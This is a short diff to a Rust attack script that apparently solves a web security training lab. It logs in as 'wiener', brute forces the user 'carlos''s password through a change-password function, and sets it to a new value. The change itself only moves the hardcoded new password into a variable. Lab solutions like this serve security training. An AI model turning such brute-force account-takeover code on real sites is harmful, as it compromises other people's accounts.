@@ -47,6 +47,7 @@ fn main() {
         "[#] Brute forcing password of".white().bold(),
         "carlos".green().bold()
     );
+    let new_password = "Hacked"; // change this to what you want
     let passwords_count = passwords.lines().count();
     for (index, password) in passwords.lines().enumerate() {
         if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
@@ -62,7 +63,7 @@ fn main() {
                         &session,
                         "carlos",
                         password,
-                        "Hola Hola", // chagne the current password to this one
+                        new_password, // chagne the current password to this one
                     );
                     if let Ok(change_password_res) = change_password {
                         if change_password_res.status().as_u16() == 200 {
@@ -75,7 +76,7 @@ fn main() {
                             println!(
                                 "[#] {}: {}",
                                 "Password changed to".white().bold(),
-                                "Hola Hola".green().bold()
+                                new_password.green().bold()
                             );
                             break;
                         } else {
